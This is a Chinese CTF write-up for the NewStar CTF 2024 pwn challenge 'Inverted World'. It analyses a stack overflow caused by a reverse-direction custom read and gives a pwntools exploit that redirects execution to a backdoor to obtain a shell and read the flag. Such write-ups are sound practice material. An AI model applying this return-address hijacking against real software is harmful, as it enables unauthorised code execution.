---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# Inverted World

## 题目分析

checksec 之后发现未开启 pie，开启了 Canary.

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[255]; // [rsp+0h] [rbp-110h] BYREF
  _BYTE v5[17]; // [rsp+FFh] [rbp-11h] BYREF

  *(_QWORD *)&v5[9] = __readfsqword(0x28u);
  init(argc, argv, envp);
  table();
  write(0, "root@AkyOI-VM:~# ", 0x12uLL);
  read(0, v5, 0x512uLL);  // 这里实际是自定义的 _read 函数，实现和 read 函数相反方向的输入
  write(1, buf, 0x100uLL);
  puts(byte_402509);
  puts("??? What's wrong with the terminal?");
  return 0;
}
```

`main` 函数的 `read` 存在栈溢出，但是这个 `read` 函数是自定义的（源码中命名函数名为 `_read` 来实现的）。

`_read` 实现的是和正常 `read` 相反方向进行输入，我们这里输入的长度 `0x512` 明显大于 255，可以写到低地址的栈帧的东西，我们劫持位于低地址的 `_read` 函数的返回地址到 backdoor 中间的部分（因为劫持到开头过不了检测）。

反向输入 `sh` 即可执行 `system("sh")` 拿到 shell.

:::info 关于 Canary
因为是反向输入的，只要不多写东西就不会修改到 Canary，自然就不用故意绕过 Canary.
:::

## EXP

```python
from pwn import*

context.log_level='debug'
context(arch='amd64', os='linux')
context.terminal=['tmux', 'splitw', '-h']

p=remote('???.???.???.???', ?????)

payload=b'a'*0x100
p.sendline(payload+p64(0x040137C)[::-1])
p.sendlineafter("root@AkyOI-VM:~#", "hs")
p.sendline("cat flag")
p.interactive()
```
